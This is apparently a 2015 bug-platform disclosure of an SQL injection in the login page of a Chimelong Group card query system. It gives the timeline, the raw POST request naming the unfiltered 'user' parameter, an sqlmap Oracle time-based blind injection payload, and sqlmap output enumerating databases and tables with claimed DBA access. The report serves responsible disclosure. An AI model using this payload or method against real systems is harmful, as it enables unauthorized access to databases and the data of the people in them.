wybug_title: 长隆集团某系统SQL注入(DBA权限)
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-05：	细节已通知厂商并且等待厂商处理中									2015-12-09：	厂商已经确认，细节仅向厂商公开									2015-12-19：	细节向核心白帽子及相关领域专家公开									2015-12-29：	细节向普通白帽子公开									2016-01-08：	细节向实习白帽子公开									2016-01-21：	细节向公众公开  简要描述： RT~有礼物吗？ 详细说明：  长隆牡丹卡自助查询系统。。。http://**.**.**.**/search/login.php

   漏洞证明：  登录处SQL注入
POST /search/login.php HTTP/1.1Host: **.**.**.**Proxy-Connection: keep-aliveContent-Length: 35Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**/search/login.phpAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: Hm_lvt_845bef98c7b6fcce916618254fda1b24=1449107427; _ga=GA1.2.1232747967.1449107428; __utma=111750870.1232747967.1449107428.1449107428.1449107428.1; __utmz=111750870.1449107428.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=m2s8him2b7qhf68rf9k1vrird7act=login&user=1&password=1&submit=
参数user未过滤
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: user (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: act=login&user=525252525252' AND 9980=DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(70)||CHR(122)||CHR(100),5) AND 'KDla'='KDla&password=admin&submit=---web server operating system: Windowsweb application technology: PHP 5.2.10, Apache 2.0.63back-end DBMS: OracleNo tables foundsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: user (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: act=login&user=525252525252' AND 9980=DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(70)||CHR(122)||CHR(100),5) AND 'KDla'='KDla&password=admin&submit=---web server operating system: Windowsweb application technology: PHP 5.2.10, Apache 2.0.63back-end DBMS: Oracleavailable databases [16]:[*] "]YUM`LAAK#!		11D!)|P~A	"[*] "`\?86STEM"[*] "ORDTYSC!7"[*] "OUTLP%T\E"[*] "QXFSYSJ		"[*] "SAS=2"[*] "T]KTTB"[*] CHIME[*] CTXSYS[*] DBSNMP[*] DMSYS[*] MDSYS[*] OLAPeYS[*] TSMSYS[*] WMSYS[*] XDB
数据很多就没有跑下去了。。。。
Database: XDB[14 tables]+--------------------+| DATABASES          || ORDERITEMS         || PERSONNE           || R2WEIGHTS          || ROLE               || LOGINS             || MWUSER             || NOTAFISCAL_DEDUCAO || PEER_CONFIGS       || PRINCIPAL          || STUDENT            || TURNS              || USR_PASS           || ZOPH_PEOPLE        |+--------------------+

Database: CTXSYS[20 tables]+-------------------+| CONFIG            || PERMISSIONS       || SITE_LOGIN        || STAATEN           || ARRAY_DATA        || IMAGEATTRIBUTE    || JIVEGROUP         || MWUSER            || NUKE_AUTHORS      || NUKE_BBPOSTS_TEXT || NUKE_ENCYCLOPEDIA || NUKE_STATS_MONTH  || OIL_COMPONENTS    || ROLES             || SOFTWARE_LICENSES || STORE1            || USER_TEST         || USER_UNAME        || USERN             || WSOP              |+-------------------+

Database: DMSYS[16 tables]+---------------------+| GDIRECTEDROUTE      || SUPPORT_INCIDENTS   || UM_USER_PERMISSIONS || BORDERS             || CDB_PMS             || FESTPLATTE          || FORUM_REPORT        || JOS_CORE_LOG_ITEMS  || MODULEPHOTO         || NUKE_FAQCATEGORIES  || PHPBB_VOTE_DESC     || RESERVATION         || SSE_FAMILIA         || STORE2              || TABLE_USER          || TBL_MEMBERS         |+---------------------+
Database: MDSYS[20 tables]+------------------------+| DM                     || ACTIVITY               || AUT                    || BINN_BANN_RESTRICTED   || BINN_ORDER_TEMPS       || BINN_PATH_TEMPS        || BINN_RUBRIKATOR_TLEVEL || CALENDARIO             || CATEGORY               || HABILIDAD              || HOT_PROP               || JOS_VM_ORDERS          || JOS_VM_PRODUCT_FILES   || MODULEMAILLING         || PARTENAIRES            || PELATES                || REGLEMENT              || SPIP_CACHES            || TB_ADMINISTRATOR       || WINDOWS                |+------------------------+DBA权限。。

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-12-09 16:35 厂商回复： CNVD未直接复现所述漏洞情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无
